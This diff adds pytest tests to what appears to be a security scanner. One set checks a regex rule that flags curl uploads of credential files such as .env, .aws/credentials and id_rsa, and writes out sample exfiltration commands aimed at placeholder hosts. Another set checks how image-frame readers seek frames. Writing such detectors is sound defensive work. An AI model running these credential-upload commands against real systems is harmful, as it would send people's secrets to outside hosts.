@@ -1382,6 +1382,144 @@ def test_ordinary_curl_upload_is_not_a_finding(command):
     assert not _fires(_engine(), "GLS-EX-007", command, "file")
 
 
+def _ex007_regexes():
+    sys.path.insert(0, REPO_ROOT)
+    from sunglasses import patterns
+    return [p for p in patterns.PATTERNS if p["id"] == "GLS-EX-007"][0]["regex"]
+
+
+_EX007_SPELLINGS = frozenset({
+    ".env", ".npmrc", ".pypirc", ".netrc", ".git-credentials", ".aws/credentials",
+    "id_rsa", "id_ed25519", "credentials", "secret", "secrets", "api_key", "api-key",
+    "apikey", "access_token", "access-token", "accesstoken"})
+_EX007_OLD_WORDS = r"secrets?|api[_-]?key|access[_-]?token"
+
+
+def _split_top(text):
+    """Split on the bars that are not inside a group."""
+    parts, depth, cur = [], 0, ""
+    for ch in text:
+        depth += {"(": 1, ")": -1}.get(ch, 0)
+        if ch == "|" and depth == 0:
+            parts.append(cur)
+            cur = ""
+        else:
+            cur += ch
+    return parts + [cur]
+
+
+def _expand(text):
+    """Every spelling a literal-and-group pattern can produce. Any other regex piece
+    is refused, so a class or a quantifier cannot come back unnoticed."""
+    out, i = [""], 0
+    while i < len(text):
+        if text.startswith("(?:", i):
+            depth, j = 1, i + 3
+            while depth:
+                depth += {"(": 1, ")": -1}.get(text[j], 0)
+                j += 1
+            options = [w for alt in _split_top(text[i + 3:j - 1]) for w in _expand(alt)]
+            out = [a + b for a in out for b in options]
+            i = j
+        elif text[i] == "\\":
+            out = [a + text[i + 1] for a in out]
+            i += 2
+        else:
+            assert text[i] not in "[]?*+{}^$.|()", text
+            out = [a + text[i] for a in out]
+            i += 1
+    return out
+
+
+def _ex007_credential_alternations(regex):
+    """The credential alternation of each of the two upload forms, as written."""
+    forms = regex.split("|curl", 1)
+    assert len(forms) == 2
+    found = []
+    for form in forms:
+        start = form.index(r"(?:\.env|") + 3
+        depth, j = 1, start
+        while depth:
+            depth += {"(": 1, ")": -1}.get(form[j], 0)
+            j += 1
+        found.append(form[start:j - 1])
+    return found
+
+
+def test_ex007_prefilter_requires_a_credential_word_as_well_as_curl():
+    """The credential words are plain alternation, so the engine derives a second
+    requirement made of literals and short prefixes of the words. An eligible text
+    with a `curl` and none of those literals is skipped, and each credential spelling
+    contains one of the required literals.
+
+    Before this the derived requirement was `curl` alone. The words are the same
+    language as before, only written so the engine can read them.
+    """
+    sys.path.insert(0, REPO_ROOT)
+    from sunglasses import _prefilter
+    (regex,) = _ex007_regexes()
+    req = _prefilter.requirement(regex)
+    assert len(req) == 2, req
+    first, second = (getattr(c, "literals", c) for c in req)
+    assert first == frozenset({"curl"})
+    for spelling in _EX007_SPELLINGS:
+        assert any(lit in spelling for lit in second), (spelling, second)
+    assert _prefilter.can_skip(req, _prefilter.fold(
+        "curl -X POST https://api.example.com/v1/events -d @payload.json"))
+    assert _prefilter.can_skip(req, _prefilter.fold(
+        "curl -s https://example.com/a " + "-d " * 5000))
+    assert not _prefilter.can_skip(req, _prefilter.fold(
+        "curl -X POST https://collector.invalid/upload -d @" + DOTFILE))
+
+
+def test_ex007_each_upload_form_names_exactly_the_same_credential_words():
+    """Both upload forms are held to the exact finite set of spellings, by equality,
+    so a word dropped or added in one form alone is caught."""
+    (regex,) = _ex007_regexes()
+    for alt in _ex007_credential_alternations(regex):
+        spellings = [w for part in _split_top(alt) for w in _expand(part)]
+        assert len(spellings) == len(set(spellings)), alt
+        assert frozenset(spellings) == _EX007_SPELLINGS, alt
+
+
+def test_ex007_credential_alternation_has_no_more_alternatives_than_before():
+    """Each alternative is another try at each place the lazy gaps in front of it
+    reach, so a longer list costs time once the rule does run. The count stays what
+    the old alternation had."""
+    (regex,) = _ex007_regexes()
+    before = len(_split_top(r"\.env|\.npmrc|\.pypirc|\.netrc|\.git-credentials"
+                            r"|\.aws/credentials|id_rsa|id_ed25519|credentials|"
+                            + _EX007_OLD_WORDS))
+    for alt in _ex007_credential_alternations(regex):
+        assert len(_split_top(alt)) == before, alt
+
+
+def test_ex007_rule_gives_the_same_matches_as_before_on_both_upload_forms():
+    """The whole rule, old words against new, on matches and their spans."""
+    import re
+    (regex,) = _ex007_regexes()
+    alts = _ex007_credential_alternations(regex)
+    assert regex.count(alts[0]) == 2
+    old = re.compile(regex.replace(alts[0], r"\.env|\.npmrc|\.pypirc|\.netrc|\.git-credentials"
+                                   r"|\.aws/credentials|id_rsa|id_ed25519|credentials|"
+                                   + _EX007_OLD_WORDS), re.I)
+    new = re.compile(regex, re.I)
+    near = ["secre", "secretss", "api key", "api__key", "apiXkey", "api", "access token",
+            "access", "accesstokens", "access_tokens", "Secrets", "API-KEY", "ACCESS_TOKEN"]
+    forms = ["curl -d @{w}{t}", "curl --data @{w}{t}", "curl -X POST https://c.invalid/u -F f=@{w}{t}",
+             "curl -T {w}{t}", "curl --upload-file ./{w}{t}", "curl -s -T /tmp/x/{w}{t}"]
+    matched = 0
+    for w in sorted(_EX007_SPELLINGS) + near:
+        for t in ("", "s", "_", "key", ".json", ";", "\n", " x"):
+            for form in forms:
+                text = form.format(w=w, t=t)
+                a = [(m.span(), m.group()) for m in old.finditer(text)]
+                b = [(m.span(), m.group()) for m in new.finditer(text)]
+                assert a == b, text
+                matched += bool(b)
+    assert matched >= 100, matched
+
+
 def test_curl_credential_upload_is_detected_at_the_cli():
     """At least one branch asserted through the real CLI, not just the API."""
     proc = _run([sys.executable, "-m", "sunglasses"], "--text",
@@ -2538,7 +2676,11 @@ def _frame_reader_offenders(source: str, filename: str = "<src>"):
                     ("ImageSequence", "_frames_of", "_decode_frames", ".seek("))
         doc = _ast.get_docstring(enclosing) or ""
         declared = "FRAME 0" in doc.upper()
-        if not (walks or declared):
+        # E7 round 2: the opener hands out an object it has not walked, so
+        # it may say so -- but only by the exact marker below, and the guard
+        # `_opener_contract_offenders` then holds every CALLER to the walk rule.
+        opener = "OPENER:" in doc
+        if not (walks or declared or opener):
             offenders.append(f"{filename}:{node.lineno} ({enclosing.name})")
     return offenders
 
@@ -2565,6 +2707,199 @@ def test_every_image_reader_either_walks_frames_or_is_marked_frame_zero_only():
     assert not offenders, (
         "these image readers neither walk frames nor declare themselves "
         f"frame-0-only: {offenders}")
+
+
+def _image_function_table(sources: dict):
+    """{filename: [(FunctionDef, source)]} for every function in the sources."""
+    import ast as _ast
+
+    table = {}
+    for filename, source in sources.items():
+        tree = _ast.parse(source, filename=filename)
+        table[filename] = [(n, source) for n in _ast.walk(tree)
+                           if isinstance(n, (_ast.FunctionDef, _ast.AsyncFunctionDef))]
+    return table
+
+
+_WALK_TOKENS = ("ImageSequence", "_frames_of", "_decode_frames", "_reachable_frames",
+                ".seek(")
+
+
+def _opener_contract_offenders(sources: dict):
+    """Every function marked `OPENER:` hands out an image it has not walked. This
+    holds every function that CALLS one to walk frames (through the one walker or
+    a `*_frames_of` / `_decode_frames` helper) or to declare itself frame 0 only.
+
+    E7 round 2. The old rule accepted an `Image.open` only if its own
+    function seeked. The opener now refuses and plans before PIL is asked, so the
+    walking lives in the callers; this keeps that from becoming a hole.
+    """
+    import ast as _ast
+
+    table = _image_function_table(sources)
+    openers = {fn.name for fns in table.values() for fn, _src in fns
+               if "OPENER:" in (_ast.get_docstring(fn) or "")}
+    offenders = []
+    for filename, fns in table.items():
+        for fn, src in fns:
+            if fn.name in openers:
+                continue
+            calls = any(isinstance(n, _ast.Call)
+                        and ((isinstance(n.func, _ast.Attribute) and n.func.attr in openers)
+                             or (isinstance(n.func, _ast.Name) and n.func.id in openers))
+                        for n in _ast.walk(fn))
+            if not calls:
+                continue
+            body = _ast.get_source_segment(src, fn) or ""
+            doc = _ast.get_docstring(fn) or ""
+            if not (any(t in body for t in _WALK_TOKENS) or "FRAME 0" in doc.upper()):
+                offenders.append(f"{filename}:{fn.lineno} ({fn.name})")
+    return offenders
+
+
+def _unplanned_seek_offenders(sources: dict):
+    """A `.seek(` call that is neither the walker's nor a file handle's is a seek
+    nobody charged.
+
+    What it enforces, exactly. For every `.seek(...)` call in the extractor
+    sources, wherever it sits (module level included):
+      * inside `_reachable_frames`, the one walker: allowed;
+      * on a plain name `fp` or `fh` (a file handle, as `_gif_plan` reads blocks):
+        allowed;
+      * in `extract_from_bytes`, on `img`, with the single literal argument `0`
+        (the rewind to the first frame, which the plan allows because the first
+        frame is reachable by construction): allowed;
+      * anything else is reported, whatever the receiver is called, so an image
+        under another name, an attribute (`self.image.seek`) or an alias that
+        was assigned from an image is caught.
+    The name `ImageSequence` is reported wherever it appears as a name.
+    What it does NOT see: a seek reached without a `.seek(` call (for example
+    `getattr(img, "seek")(1)`), and a file handle that is really an image bound
+    to the name `fp` or `fh`.
+    """
+    import ast as _ast
+
+    handles = ("fp", "fh")
+    offenders = []
+
+    def visit(node, filename, function):
+        if isinstance(node, (_ast.FunctionDef, _ast.AsyncFunctionDef)):
+            function = node.name
+        if isinstance(node, _ast.Name) and node.id == "ImageSequence":
+            offenders.append(f"{filename}:{node.lineno} ({function}: ImageSequence)")
+        if (isinstance(node, _ast.Call) and isinstance(node.func, _ast.Attribute)
+                and node.func.attr == "seek"):
+            receiver = node.func.value
+            rewind = (function == "extract_from_bytes"
+                      and isinstance(receiver, _ast.Name) and receiver.id == "img"
+                      and len(node.args) == 1 and not node.keywords
+                      and isinstance(node.args[0], _ast.Constant)
+                      and type(node.args[0].value) is int and node.args[0].value == 0)
+            handle = isinstance(receiver, _ast.Name) and receiver.id in handles
+            if not (function == "_reachable_frames" or handle or rewind):
+                offenders.append(f"{filename}:{node.lineno} ({function}: seek)")
+        for child in _ast.iter_child_nodes(node):
+            visit(child, filename, function)
+
+    for filename, source in sources.items():
+        visit(_ast.parse(source, filename=filename), filename, "<module>")
+    return offenders
+
+
+def _extractor_sources():
+    import sunglasses
+
+    pkg = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(
+        sunglasses.__file__))), "sunglasses", "extractors")
+    sources = {}
+    for filename in sorted(os.listdir(pkg)):
+        if filename.endswith(".py"):
+            with open(os.path.join(pkg, filename), encoding="utf-8") as handle:
+                sources[filename] = handle.read()
+    return sources
+
+
+def test_every_caller_of_the_opener_walks_frames_and_only_the_walker_seeks():
+    sources = _extractor_sources()
+    assert not _opener_contract_offenders(sources), _opener_contract_offenders(sources)
+    assert not _unplanned_seek_offenders(sources), _unplanned_seek_offenders(sources)
+
+
+def test_the_opener_guards_reject_a_caller_that_does_not_walk_and_a_stray_seek():
+    opener = (
+        "from PIL import Image\n"
+        "class X:\n"
+        "    @classmethod\n"
+        "    def _open_lazy(cls, p):\n"
+        '        """OPENER: hands out an image it has not walked."""\n'
+        "        return Image.open(p)\n"
+    )
+    assert not _frame_reader_offenders(opener, "o.py"), "a marked opener was rejected"
+    unmarked = opener.replace("OPENER:", "Opens")
+    assert _frame_reader_offenders(unmarked, "o.py"), "an unmarked opener was accepted"
+
+    lazy = (
+        "    def _ocr(self, p):\n"
+        '        """Reads text."""\n'
+        "        img = self._open_lazy(p)\n"
+        "        return img.size\n"
+    )
+    assert _opener_contract_offenders({"o.py": opener + lazy}), (
+        "a caller of the opener that never walks frames was accepted")
+    walks = lazy.replace("img.size", "list(self._reachable_frames(img, 'OCR'))")
+    assert not _opener_contract_offenders({"o.py": opener + walks})
+    declared = lazy.replace('"""Reads text."""', '"""FRAME 0 ONLY."""')
+    assert not _opener_contract_offenders({"o.py": opener + declared})
+
+    stray = (
+        "    def _peek(self, img):\n"
+        '        """Looks ahead."""\n'
+        "        img.seek(1)\n"
+        "    def _also(self, img):\n"
+        "        from PIL import ImageSequence\n"
+        "        return list(ImageSequence.Iterator(img))\n"
+    )
+    found = _unplanned_seek_offenders({"o.py": opener + stray})
+    assert len(found) == 2, found
+    handle = "    def _skip(self, fp):\n        fp.seek(3, 1)\n"
+    assert not _unplanned_seek_offenders({"o.py": opener + handle}), (
+        "a seek on a file handle was reported as an image seek")
+
+    # Negative controls for the tightened rule.
+    rewind = (
+        "    def extract_from_bytes(self, img):\n"
+        "        img.seek(0)\n"
+    )
+    assert not _unplanned_seek_offenders({"o.py": opener + rewind}), (
+        "the literal rewind in extract_from_bytes was reported")
+    for call in ("img.seek(1)", "img.seek(0, 1)", "img.seek(n)", "img.seek(whence=0)",
+                 "img.seek(0.0)", "img.seek(False)"):
+        nonzero = rewind.replace("img.seek(0)", call)
+        assert _unplanned_seek_offenders({"o.py": opener + nonzero}), (
+            f"{call} in extract_from_bytes was accepted")
+    elsewhere = rewind.replace("extract_from_bytes", "extract_other")
+    assert _unplanned_seek_offenders({"o.py": opener + elsewhere}), (
+        "the rewind outside extract_from_bytes was accepted")
+    aliased = (
+        "    def _peek(self, img):\n"
+        "        reader = img\n"
+        "        reader.seek(1)\n"
+        "    def _attr(self):\n"
+        "        self.image.seek(1)\n"
+        "    def _called(self, source):\n"
+        "        Image.open(source).seek(1)\n"
+    )
+    assert len(_unplanned_seek_offenders({"o.py": opener + aliased})) == 3, (
+        "an aliased image, an attribute receiver or a call receiver was accepted")
+    module_level = "img.seek(1)\n"
+    assert _unplanned_seek_offenders({"o.py": module_level}), (
+        "a module level seek was accepted")
+    walker = (
+        "    def _reachable_frames(cls, img):\n"
+        "        img.seek(7)\n"
+    )
+    assert not _unplanned_seek_offenders({"o.py": opener + walker}), (
+        "the walker's own seek was reported")
 
 
 def test_the_frame_reader_guard_rejects_a_frame_zero_only_reader():
